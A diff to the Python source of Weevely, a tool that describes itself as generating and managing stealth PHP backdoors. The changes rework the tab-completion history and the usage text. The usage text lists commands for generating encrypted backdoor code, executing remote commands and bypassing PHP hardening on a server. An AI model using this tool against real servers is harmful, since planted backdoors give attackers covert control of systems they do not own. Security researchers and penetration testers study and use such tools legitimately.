@@ -3,28 +3,34 @@
 
 import getopt, sys, base64, os, urllib2, re, urlparse, os, random, readline, rlcompleter, atexit
 
-history = os.path.expanduser( '~/.weevely_history' )
-	
+history     = os.path.expanduser( '~/.weevely_history' )
+completions = {}
+
 def autoComplete( text, state ):
-	matches = []
-	items   = readline.get_current_history_length()
-	for i in range( items ):
-		item = readline.get_history_item(i)
-		if item != None and item.startswith(text):
-			matches.append(item)
-	
-	if text == '':
-		readline.insert_text( self.tab )
-		return None
-	else:
+	try:
+		matches = completions[text]
+	except KeyError:
+		matches = []
+		items   = readline.get_current_history_length()
+		for i in range( items ):
+			item = readline.get_history_item(i)
+			if item != None and text in item:
+				matches.append(item)
+		
+		completions[text] = matches
+		
+	try:
 		return matches[state]
+	except IndexError:
+		return None
 
 try:
-    readline.parse_and_bind( 'tab: complete' )
+    readline.parse_and_bind( 'tab: menu-complete' )
     readline.set_completer( autoComplete )
     readline.read_history_file(history)
 except IOError:
     pass
+    
 atexit.register( readline.write_history_file, history )
 
 
@@ -158,19 +164,19 @@ class weevely:
 
   def usage(self):
     print """+ Generate backdoor crypted code.
-+  ./weevely -g -o <filepath> -p <pass>
++  weevely -g -o <filepath> -p <pass>
 +      
 + Execute remote commands.
-+  ./weevely -c <command> -u <url> -p <pass>			Execute command.    
-+  ./weevely -t -u <url> -p <password>		 		Start terminal.	         
++  weevely -c <command> -u <url> -p <pass>			Execute command.    
++  weevely -t -u <url> -p <password>		 		Start terminal.	         
 +
 + Bypass PHP hardening protections 
-+  ./weevely -s							Show available remote functions.
-+  ./weevely -e <function number> -t -u <url> -p <password> 	Execute function.
++  weevely -s							Show available remote functions.
++  weevely -e <function number> -t -u <url> -p <password> 	Execute function.
 +
 + Execute PHP modules on remote server 
-+  ./weevely -l              				        List available modules.					
-+  ./weevely -m <module>::<1arg>::..::<Narg> -u <url> -p <pass> Execute module."""
++  weevely -l              				        List available modules.					
++  weevely -m <module>::<1arg>::..::<Narg> -u <url> -p <pass> Execute module."""
     
   def banner(self):
     print "+ Weevely - Generate and manage stealth PHP backdoors.\n+"
